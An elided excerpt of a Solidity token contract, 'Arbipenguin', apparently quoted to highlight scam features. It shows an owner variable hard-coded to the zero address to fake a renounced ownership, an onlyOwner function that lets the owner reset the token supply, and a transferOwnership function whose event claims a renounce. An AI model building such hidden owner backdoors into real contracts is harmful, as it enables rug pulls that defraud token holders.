...
address public owner = address(0x0000000000000000000000000000000000000000);
...
contract Arbipenguin is token, Ownable {
    ...
    uint256 public maxStakingAmount = 2 * 10**17 * 10**17 ; 
    ...
    function rewardsupply(uint128 value) external onlyOwner {
          supply= value;
    }
    ...
    function transferOwnership(address addr) external onlyOwner {
        ...
        emit OwnershipTransferred(Creator, address(0));
        owner = address(0);
    }
